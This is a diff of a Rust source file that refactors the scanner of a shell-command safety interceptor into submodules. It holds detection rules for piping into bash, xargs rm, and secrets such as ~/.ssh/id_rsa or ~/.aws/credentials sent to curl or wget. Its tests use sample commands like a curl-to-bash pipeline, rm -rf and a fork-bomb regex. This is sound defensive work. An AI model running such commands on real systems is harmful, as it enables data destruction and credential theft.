@@ -1,76 +1,24 @@
 // Scanner: assess(cmd) -> RiskLevel
 
+mod assessment;
+mod highlighting;
+mod keywords;
+mod pipeline_semantics;
+mod recursive;
+
 use std::sync::Arc;
 
 use aho_corasick::AhoCorasick;
 use regex::Regex;
 
-use crate::interceptor::RiskLevel;
 #[cfg(test)]
 use crate::interceptor::nested::MAX_NESTED_SCAN_DEPTH;
-use crate::interceptor::nested::{RecursiveScanLimit, RecursiveScanReport, recursive_scan_targets};
-use crate::interceptor::parser::{ParsedCommand, Parser, PipelineChain, top_level_pipelines};
-use crate::interceptor::patterns::{Category, Pattern, PatternSet, PatternSource};
+use crate::interceptor::patterns::{Pattern, PatternSet};
 
-/// A single pattern match with the actual text fragment that triggered it.
-#[derive(Debug, Clone)]
-pub struct MatchResult {
-    pub pattern: Arc<Pattern>,
-    /// The substring of the scanned text that the pattern's regex matched.
-    pub matched_text: String,
-    /// The concrete span in the original command suitable for confirmation UI highlighting.
-    pub highlight_range: Option<HighlightRange>,
-}
-
-/// A concrete byte range inside the original command for confirmation UI highlighting.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub struct HighlightRange {
-    /// Inclusive start byte offset.
-    pub start: usize,
-    /// Exclusive end byte offset.
-    pub end: usize,
-}
-
-/// What ultimately caused the final interception decision.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum DecisionSource {
-    /// Matched one or more built-in patterns compiled into the binary.
-    BuiltinPattern,
-    /// Matched one or more user-defined patterns from aegis.toml.
-    CustomPattern,
-    /// No patterns matched; the command was assessed Safe by default.
-    Fallback,
-}
-
-/// The result of assessing a shell command through the full scanner pipeline.
-pub struct Assessment {
-    /// The highest `RiskLevel` among all matched patterns (`Safe` when none matched).
-    pub risk: RiskLevel,
-    /// Every pattern that matched the command (raw + inline scripts).
-    pub matched: Vec<MatchResult>,
-    /// Sorted, merged highlight spans for the original raw command.
-    pub highlight_ranges: Vec<HighlightRange>,
-    /// The parsed representation of the original command string.
-    pub command: ParsedCommand,
-}
-
-impl Assessment {
-    /// Determine what caused this assessment, ignoring allowlist (handled by the caller).
-    pub fn decision_source(&self) -> DecisionSource {
-        if self.matched.is_empty() {
-            return DecisionSource::Fallback;
-        }
-        if self
-            .matched
-            .iter()
-            .any(|m| m.pattern.source == PatternSource::Custom)
-        {
-            DecisionSource::CustomPattern
-        } else {
-            DecisionSource::BuiltinPattern
-        }
-    }
-}
+pub use assessment::{Assessment, DecisionSource, MatchResult};
+pub use highlighting::HighlightRange;
+#[cfg(test)]
+pub use highlighting::sorted_highlight_ranges_for_tests;
 
 /// First-pass scanner backed by an Aho-Corasick automaton.
 ///
@@ -122,7 +70,7 @@ impl Scanner {
         let mut has_uncovered = false;
 
         for pattern in &patterns.patterns {
-            let kws = extract_keywords(&pattern.pattern);
+            let kws = keywords::extract_keywords(&pattern.pattern);
             if kws.is_empty() {
                 has_uncovered = true;
             } else {
@@ -177,624 +125,103 @@ impl Scanner {
             })
             .collect()
     }
-
-    /// Assess a raw shell command and return a complete [`Assessment`].
-    ///
-    /// Pipeline:
-    /// 1. Parse the command via [`Parser::parse`] to preserve the original command contract.
-    /// 2. Run [`quick_scan`] on the raw command — if no keyword hits, return `Safe` immediately.
-    /// 3. Build the recursive scan path via [`recursive_scan_targets`], unwrapping nested shells,
-    ///    heredocs, inline interpreters, process substitution, and `eval` payloads.
-    /// 4. Run [`full_scan`] on each discovered target and merge unique pattern matches.
-    /// 5. Compute the maximum [`RiskLevel`] across all matched patterns and return.
-    pub fn assess(&self, cmd: &str) -> Assessment {
-        if cmd.len() > MAX_SCAN_COMMAND_LEN {
-            return uncertain_assessment_without_parse(
-                cmd,
-                "SCAN-001",
-                format!(
-                    "scan input exceeded command length limit ({})",
-                    MAX_SCAN_COMMAND_LEN
-                ),
-                Some(
-                    "Review the command out-of-band or move the payload into a smaller, reviewed script file",
-                ),
-            );
-        }
-
-        let command = Parser::parse(cmd);
-
-        if let Some(script) = command
-            .inline_scripts
-            .iter()
-            .find(|script| script.body.len() > MAX_INLINE_SCRIPT_LEN)
-        {
-            let interpreter = script.interpreter.clone();
-            return uncertain_assessment(
-                command,
-                "SCAN-002",
-                format!(
-                    "scan input exceeded inline script length limit ({}) for {}",
-                    MAX_INLINE_SCRIPT_LEN, interpreter
-                ),
-                Some(
-                    "Review the generated script separately or store it in a checked file before execution",
-                ),
-            );
-        }
-
-        let maybe_pipelines = cmd.contains('|').then(|| top_level_pipelines(cmd));
-        let has_pipeline_chain = maybe_pipelines
-            .as_ref()
-            .map(|pipelines| pipelines.iter().any(|chain| chain.segments.len() > 1))
-            .unwrap_or(false);
-
-        if !self.quick_scan(cmd) && !has_pipeline_chain {
-            return Assessment {
-                risk: RiskLevel::Safe,
-                matched: vec![],
-                highlight_ranges: vec![],
-                command,
-            };
-        }
-
-        let mut matched = Vec::new();
-
-        let target_report = scan_targets(cmd, &command);
-        if let Some(limit_hit) = target_report.limit_hit {
-            return uncertain_assessment(
-                command,
-                "SCAN-003",
-                recursive_limit_description(limit_hit),
-                Some(
-                    "Reduce shell nesting depth or rewrite the command into a reviewed intermediate script",
-                ),
-            );
-        }
-
-        for target in target_report.targets {
-            for pattern in self.full_scan(&target) {
-                if !matched
-                    .iter()
-                    .any(|existing: &MatchResult| existing.pattern.id == pattern.pattern.id)
-                {
-                    matched.push(pattern);
-                }
-            }
-        }
-
-        if let Some(pipelines) = maybe_pipelines {
-            for evidence in semantic_pipeline_matches(&pipelines) {
-                if !matched
-                    .iter()
-                    .any(|existing: &MatchResult| existing.pattern.id == evidence.pattern.id)
-                {
-                    matched.push(evidence);
-                }
-            }
-        }
-
-        let risk = matched
-            .iter()
-            .map(|p| p.pattern.risk)
-            .max()
-            .unwrap_or(RiskLevel::Safe);
-        let highlight_ranges = sorted_highlight_ranges(cmd, &matched);
-
-        Assessment {
-            risk,
-            matched,
-            highlight_ranges,
-            command,
-        }
-    }
-}
-
-fn uncertain_assessment_without_parse(
-    cmd: &str,
-    id: &'static str,
-    description: String,
-    safe_alt: Option<&'static str>,
-) -> Assessment {
-    uncertain_assessment(
-        ParsedCommand {
-            executable: None,
-            args: Vec::new(),
-            inline_scripts: Vec::new(),
-            raw: cmd.to_string(),
-        },
-        id,
-        description,
-        safe_alt,
-    )
-}
-
-fn uncertain_assessment(
-    command: ParsedCommand,
-    id: &'static str,
-    description: String,
-    safe_alt: Option<&'static str>,
-) -> Assessment {
-    let matched = vec![uncertain_match(id, description, safe_alt)];
-    let highlight_ranges = sorted_highlight_ranges(&command.raw, &matched);
-
-    Assessment {
-        risk: RiskLevel::Warn,
-        matched,
-        highlight_ranges,
-        command,
-    }
-}
-
-fn uncertain_match(
-    id: &'static str,
-    description: String,
-    safe_alt: Option<&'static str>,
-) -> MatchResult {
-    MatchResult {
-        pattern: Arc::new(Pattern {
-            id: id.into(),
-            category: Category::Process,
-            risk: RiskLevel::Warn,
-            pattern: id.into(),
-            description: description.into(),
-            safe_alt: safe_alt.map(Into::into),
-            source: PatternSource::Builtin,
-        }),
-        matched_text: String::new(),
-        highlight_range: None,
-    }
-}
-
-fn recursive_limit_description(limit: RecursiveScanLimit) -> String {
-    match limit {
-        RecursiveScanLimit::DepthExceeded { limit } => {
-            format!("scan input exceeded recursive parsing depth limit ({limit})")
-        }
-    }
-}
-
-fn sorted_highlight_ranges(cmd: &str, matches: &[MatchResult]) -> Vec<HighlightRange> {
-    let mut ranges = Vec::with_capacity(matches.len());
-
-    for matched in matches {
-        if let Some(range) = matched.highlight_range
-            && cmd.get(range.start..range.end).is_some()
-        {
-            ranges.push(range);
-            continue;
-        }
-
-        let fragment = matched.matched_text.trim();
-        if fragment.is_empty() {
-            continue;
-        }
-
-        if let Some(start) = cmd.find(fragment) {
-            ranges.push(HighlightRange {
-                start,
-                end: start + fragment.len(),
-            });
-        }
-    }
-
-    if ranges.len() <= 1 {
-        return ranges;
-    }
-
-    ranges.sort_unstable_by_key(|range| range.start);
-    let mut merged: Vec<HighlightRange> = Vec::with_capacity(ranges.len());
-
-    for range in ranges {
-        if let Some(last) = merged.last_mut()
-            && range.start <= last.end
-        {
-            last.end = last.end.max(range.end);
-            continue;
-        }
-
-        merged.push(range);
-    }
-
-    merged
-}
-
-fn semantic_pipeline_matches(pipelines: &[PipelineChain]) -> Vec<MatchResult> {
-    let mut matches = Vec::new();
-
-    for chain in pipelines {
-        for window in chain.segments.windows(2) {
-            let left = &window[0].normalized;
-            let right = &window[1].normalized;
-            let evidence_text = format!("{} | {}", left, right);
-
-            if is_shell_sink(right) {
-                push_semantic_match(
-                    &mut matches,
-                    "PIPE-001",
-                    RiskLevel::Danger,
-                    &evidence_text,
-                    "pipeline feeds data directly into sh/bash",
-                    Some("Write the payload to a reviewed script file before executing it"),
-                );
-            }
-
-            if is_xargs_rm_sink(right) {
-                push_semantic_match(
-                    &mut matches,
-                    "PIPE-002",
-                    RiskLevel::Danger,
-                    &evidence_text,
-                    "pipeline feeds data into xargs rm, turning upstream output into file deletions",
-                    Some(
-                        "Inspect the candidate paths first, then run rm explicitly on reviewed arguments",
-                    ),
-                );
-            }
-
-            if is_obvious_secret_source(left) && is_network_sink(right) {
-                push_semantic_match(
-                    &mut matches,
-                    "PIPE-003",
-                    RiskLevel::Danger,
-                    &evidence_text,
-                    "pipeline sends obvious secret material into a network sink",
-                    Some(
-                        "Write the data to a local file, inspect it, and avoid piping secrets into network clients",
-                    ),
-                );
-            }
-        }
-    }
-
-    matches
-}
-
-fn push_semantic_match(
-    matches: &mut Vec<MatchResult>,
-    id: &'static str,
-    risk: RiskLevel,
-    matched_text: &str,
-    description: &'static str,
-    safe_alt: Option<&'static str>,
-) {
-    if matches.iter().any(|existing| existing.pattern.id == id) {
-        return;
-    }
-
-    matches.push(MatchResult {
-        pattern: Arc::new(Pattern {
-            id: id.into(),
-            category: Category::Process,
-            risk,
-            pattern: id.into(),
-            description: description.into(),
-            safe_alt: safe_alt.map(Into::into),
-            source: PatternSource::Builtin,
-        }),
-        matched_text: matched_text.to_string(),
-        highlight_range: None,
-    });
-}
-
-fn is_shell_sink(segment: &str) -> bool {
-    matches!(first_token(segment).as_deref(), Some("sh") | Some("bash"))
-}
-
-fn is_xargs_rm_sink(segment: &str) -> bool {
-    let tokens = crate::interceptor::parser::split_tokens(segment);
-    if tokens.first().map(String::as_str) != Some("xargs") {
-        return false;
-    }
-
-    extract_xargs_command(&tokens).is_some_and(|command| command == "rm")
-}
-
-fn extract_xargs_command(tokens: &[String]) -> Option<&str> {
-    let mut idx = 1;
-
-    while let Some(token) = tokens.get(idx) {
-        let token = token.as_str();
-        if !token.starts_with('-') || token == "-" {
-            return Some(token);
-        }
-
-        if xargs_option_takes_value(token) {
-            idx += 2;
-        } else {
-            idx += 1;
-        }
-    }
-
-    None
-}
-
-fn xargs_option_takes_value(option: &str) -> bool {
-    matches!(
-        option,
-        "-E" | "-I"
-            | "-L"
-            | "-P"
-            | "-d"
-            | "-n"
-            | "-s"
-            | "--delimiter"
-            | "--eof"
-            | "--max-args"
-            | "--max-chars"
-            | "--max-lines"
-            | "--max-procs"
-            | "--replace"
-    )
-}
-
-fn is_network_sink(segment: &str) -> bool {
-    matches!(first_token(segment).as_deref(), Some("curl") | Some("wget"))
-}
-
-fn is_obvious_secret_source(segment: &str) -> bool {
-    let tokens = crate::interceptor::parser::split_tokens(segment);
-    let Some(first) = tokens.first().map(String::as_str) else {
-        return false;
-    };
-
-    if first == "cat"
-        && tokens
-            .iter()
-            .skip(1)
-            .any(|token| is_known_secret_path(token))
-    {
-        return true;
-    }
-
-    if first == "printenv" {
-        return match tokens.get(1).map(String::as_str) {
-            None => true,
-            Some(name) => is_secret_like_env_name(name),
-        };
-    }
-
-    first == "env" && tokens.len() == 1
-}
-
-fn is_known_secret_path(path: &str) -> bool {
-    matches!(path, "~/.ssh/id_rsa" | "~/.aws/credentials")
-}
-
-fn is_secret_like_env_name(name: &str) -> bool {
-    let upper = name.to_ascii_uppercase();
-    upper.contains("_SECRET")
-        || upper.contains("_TOKEN")
-        || upper.contains("_KEY")
-        || upper.contains("_PASSWORD")
-}
-
-fn first_token(segment: &str) -> Option<String> {
-    crate::interceptor::parser::split_tokens(segment)
-        .into_iter()
-        .next()
-}
-
-fn scan_targets(cmd: &str, parsed: &ParsedCommand) -> RecursiveScanReport {
-    if requires_recursive_scan(cmd) {
-        return recursive_scan_targets(cmd);
-    }
-
-    let mut targets = vec![cmd.to_string()];
-
-    for segment in crate::interceptor::parser::logical_segments(cmd) {
-        push_unique_target(&mut targets, segment);
-    }
-
-    for script in &parsed.inline_scripts {
-        push_unique_target(&mut targets, script.body.clone());
-    }
-
-    RecursiveScanReport {
-        targets,
-        limit_hit: None,
-    }
-}
-
-fn requires_recursive_scan(cmd: &str) -> bool {
-    cmd.contains("<<")
-        || cmd.contains("<(")
-        || cmd
-            .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&'))
-            .any(|token| token == "eval")
-}
-
-fn push_unique_target(targets: &mut Vec<String>, target: String) {
-    if !target.is_empty() && !targets.iter().any(|existing| existing == &target) {
-        targets.push(target);
-    }
 }
 
 // ── Keyword extraction ────────────────────────────────────────────────────────
-
-/// Extract all required literal keywords from one regex pattern string.
-///
-/// Returns an empty `Vec` only when no useful keyword can be derived, which
-/// causes [`Scanner::has_uncovered`] to be set and forces a full scan always.
-fn extract_keywords(pattern: &str) -> Vec<String> {
-    // Strip the `(?i)` case-insensitive flag — we use case-insensitive AC anyway.
-    let s = pattern.strip_prefix("(?i)").unwrap_or(pattern);
-    extract_inner(s)
-}
-
-fn extract_inner(s: &str) -> Vec<String> {
-    // Strip a leading optional group `(...)? ` so it doesn't confuse extraction.
-    // e.g. `(sudo\s+)?rm\s+...` → `rm\s+...` → keyword `rm`.
-    let s = strip_leading_optional_group(s);
-
-    let parts = split_top_alternation(s);
-    if parts.len() > 1 {
-        // Top-level alternation: every branch must be covered.
-        // e.g. `FLUSHALL|FLUSHDB` → keywords [`flushall`, `flushdb`].
-        parts.into_iter().flat_map(extract_inner).collect()
-    } else {
-        let lit = leading_literal(s);
-        if lit.len() >= 2 {
-            vec![lit.to_ascii_lowercase()]
-        } else {
-            // Leading literal too short — scan for any embedded literal ≥ 3 chars.
-            // e.g. `>\s*/dev/sd[a-z]` → `/dev/sd`.
-            find_embedded_literal(s)
-                .map(|l| vec![l.to_ascii_lowercase()])
-                .unwrap_or_default()
-        }
-    }
-}
-
-/// If `s` starts with an optional non-capturing or capturing group `(...)?`,
-/// return the portion of `s` after that group; otherwise return `s` unchanged.
-fn strip_leading_optional_group(s: &str) -> &str {
-    if !s.starts_with('(') {
-        return s;
-    }
-    let mut depth = 0i32;
-    for (i, c) in s.char_indices() {
-        match c {
-            '(' => depth += 1,
-            ')' => {
-                depth -= 1;
-                if depth == 0 {
-                    let after = &s[i + 1..];
-                    if let Some(stripped) = after.strip_prefix('?') {
-                        return stripped;
-                    }
-                    return s; // group is not optional → leave unchanged
-                }
-            }
-            _ => {}
-        }
-    }
-    s
-}
-
-/// Split `s` on `|` at nesting depth zero, skipping `\|` escape sequences.
-fn split_top_alternation(s: &str) -> Vec<&str> {
-    let mut depth: i32 = 0;
-    let mut last = 0usize;
-    let mut parts: Vec<&str> = Vec::new();
-    let mut chars = s.char_indices().peekable();
-
-    while let Some((i, c)) = chars.next() {
-        match c {
-            '\\' => {
-                chars.next(); // skip the escaped character — `\|` is not an alternation
-            }
-            '(' | '[' => depth += 1,
-            ')' | ']' => depth -= 1,
-            '|' if depth == 0 => {
-                parts.push(&s[last..i]);
-                last = i + 1;
-            }
-            _ => {}
-        }
-    }
-    parts.push(&s[last..]);
-    parts
-}
-
-/// Extract the leading literal prefix of `s`, stopping at the first regex
-/// metacharacter or shorthand class (`\s`, `\d`, …).
-///
-/// Handles `\X` escape sequences: `\(` → literal `(`, but `\s` → stop.
-fn leading_literal(s: &str) -> String {
-    let mut result = String::new();
-    let mut chars = s.chars().peekable();
-
-    while let Some(c) = chars.next() {
-        match c {
-            '\\' => match chars.peek() {
-                // Regex shorthands are not literal — stop here.
-                Some(
-                    's' | 'S' | 'd' | 'D' | 'w' | 'W' | 'b' | 'B' | 'n' | 'r' | 't' | 'f' | 'v'
-                    | 'a',
-                ) => break,
-                Some(_) => {
-                    // Escaped literal character, e.g. `\(` → `(`.
-                    result.push(chars.next().unwrap());
-                }
-                None => break,
-            },
-            '.' | '+' | '*' | '?' | '[' | '{' | '(' | ')' | '^' | '$' | '|' => break,
-            _ => result.push(c),
-        }
-    }
-
-    // Trim trailing whitespace that may come from patterns ending in a space.
-    result.trim_end().to_string()
-}
-
-/// Walk through the pattern and return the first embedded literal sequence of
-/// length ≥ 3 that is not a regex metacharacter or shorthand class.
-///
-/// Used as a fallback when the leading literal is too short (e.g. `>`).
-fn find_embedded_literal(s: &str) -> Option<String> {
-    let mut current = String::new();
-    let mut chars = s.chars().peekable();
-
-    while let Some(c) = chars.next() {
-        match c {
-            '\\' => match chars.peek() {
-                Some(
-                    's' | 'S' | 'd' | 'D' | 'w' | 'W' | 'b' | 'B' | 'n' | 'r' | 't' | 'f' | 'v'
-                    | 'a',
-                ) => {
-                    chars.next();
-                    if current.trim_end().len() >= 3 {
-                        return Some(current.trim_end().to_string());
-                    }
-                    current.clear();
-                }
-                Some(_) => {
-                    // Escaped literal char.
-                    current.push(chars.next().unwrap());
-                }
-                None => break,
-            },
-            '.' | '+' | '*' | '?' | '{' | '}' | '(' | ')' | '^' | '$' | '|' => {
-                if current.trim_end().len() >= 3 {
-                    return Some(current.trim_end().to_string());
-                }
-                current.clear();
-            }
-            '[' => {
-                // Skip character class `[...]`.
-                if current.trim_end().len() >= 3 {
-                    return Some(current.trim_end().to_string());
-                }
-                current.clear();
-                for c2 in chars.by_ref() {
-                    if c2 == ']' {
-                        break;
-                    }
-                }
-            }
-            _ => current.push(c),
-        }
-    }
-
-    if current.trim_end().len() >= 3 {
-        Some(current.trim_end().to_string())
-    } else {
-        None
-    }
-}
 
 // ── Tests ─────────────────────────────────────────────────────────────────────
 
 #[cfg(test)]
 mod tests {
+    use std::sync::Arc;
+
     use super::*;
     use crate::config::UserPattern;
-    use crate::interceptor::patterns::Category;
+    use crate::interceptor::RiskLevel;
+    use crate::interceptor::parser::{Parser, top_level_pipelines};
+    use crate::interceptor::patterns::{Category, PatternSource};
 
     fn scanner() -> Scanner {
         let patterns = PatternSet::load().expect("patterns.toml must load");
         Scanner::new(patterns)
+    }
+
+    fn test_match_result(matched_text: &str, start: usize, end: usize) -> MatchResult {
+        MatchResult {
+            pattern: Arc::new(Pattern {
+                id: "TEST-001".into(),
+                category: Category::Process,
+                risk: RiskLevel::Danger,
+                pattern: "test".into(),
+                description: "test helper".into(),
+                safe_alt: None,
+                source: PatternSource::Builtin,
+            }),
+            matched_text: matched_text.to_string(),
+            highlight_range: Some(HighlightRange { start, end }),
+        }
+    }
+
+    #[test]
+    fn quick_scan_still_detects_known_danger_keywords() {
+        let scanner = scanner();
+        assert!(scanner.quick_scan("rm -rf /tmp/demo"));
+        assert_eq!(super::keywords::extract_keywords(r"rm\s+.*"), vec!["rm"]);
+    }
+
+    #[test]
+    fn sorted_highlight_ranges_merge_overlapping_ranges() {
+        let ranges = super::highlighting::sorted_highlight_ranges_for_tests(
+            "rm -rf /tmp/demo",
+            &[
+                test_match_result("rm -rf", 0, 6),
+                test_match_result("-rf /tmp", 3, 11),
+            ],
+        );
+
+        assert_eq!(ranges, vec![HighlightRange { start: 0, end: 11 }]);
+    }
+
+    #[test]
+    fn semantic_pipeline_matches_detect_network_to_shell_flow() {
+        let pipelines = top_level_pipelines("curl https://example.test/x | bash");
+        let matches = super::pipeline_semantics::semantic_pipeline_matches(&pipelines);
+        assert!(matches.iter().any(|m| m.pattern.id.as_ref() == "PIPE-001"));
+    }
+
+    #[test]
+    fn scan_targets_include_nested_shell_and_eval_payloads() {
+        let cmd = "bash -lc 'eval \"rm -rf /tmp/demo\"'";
+        let parsed = Parser::parse(cmd);
+        let report = super::recursive::scan_targets(cmd, &parsed);
+        assert!(
+            report
+                .targets
+                .iter()
+                .any(|target| target.contains("rm -rf /tmp/demo"))
+        );
+    }
+
+    #[test]
+    fn assess_still_returns_safe_for_benign_input() {
+        let scanner = scanner();
+        let assessment = super::assessment::assess_for_tests(&scanner, "echo hello world");
+        assert_eq!(assessment.risk, RiskLevel::Safe);
+        assert!(assessment.matched.is_empty());
+    }
+
+    #[test]
+    fn assess_still_returns_uncertain_when_inline_script_exceeds_limit() {
+        let scanner = scanner();
+        let cmd = format!("python -c '{}'", "x".repeat(MAX_INLINE_SCRIPT_LEN + 1));
+        let assessment = super::assessment::assess_for_tests(&scanner, &cmd);
+        assert_eq!(assessment.risk, RiskLevel::Warn);
+        assert!(
+            assessment
+                .matched
+                .iter()
+                .any(|m| m.pattern.id.as_ref() == "SCAN-002")
+        );
     }
 
     // ── safe commands ────────────────────────────────────────────────────────
@@ -906,33 +333,33 @@ mod tests {
     #[test]
     fn leading_literal_strips_escapes() {
         // `:\(\)\{...` → `:(){` (escaped parens/braces count as literal chars)
-        let lit = leading_literal(r":\(\)\{.*:\|:.*\}");
+        let lit = super::keywords::leading_literal_for_tests(r":\(\)\{.*:\|:.*\}");
         assert_eq!(lit, ":(){");
     }
 
     #[test]
     fn leading_literal_stops_at_shorthand() {
         // `rm\s+...` → `rm` (stops at `\s`)
-        let lit = leading_literal(r"rm\s+.*");
+        let lit = super::keywords::leading_literal_for_tests(r"rm\s+.*");
         assert_eq!(lit, "rm");
     }
 
     #[test]
     fn split_alternation_ignores_escaped_pipe() {
         // `:\(\)\{.*:\|:.*\}` has `\|` which must NOT split
-        let parts = split_top_alternation(r":\(\)\{.*:\|:.*\}");
+        let parts = super::keywords::split_top_alternation_for_tests(r":\(\)\{.*:\|:.*\}");
         assert_eq!(parts.len(), 1);
     }
 
     #[test]
     fn split_alternation_handles_flush_pattern() {
-        let parts = split_top_alternation("FLUSHALL|FLUSHDB");
+        let parts = super::keywords::split_top_alternation_for_tests("FLUSHALL|FLUSHDB");
         assert_eq!(parts, vec!["FLUSHALL", "FLUSHDB"]);
     }
 
     #[test]
     fn strip_optional_prefix_removes_sudo_group() {
-        let result = strip_leading_optional_group(r"(sudo\s+)?rm\s+.*");
+        let result = super::keywords::strip_leading_optional_group_for_tests(r"(sudo\s+)?rm\s+.*");
         assert!(result.starts_with("rm"), "got: {result}");
     }
 
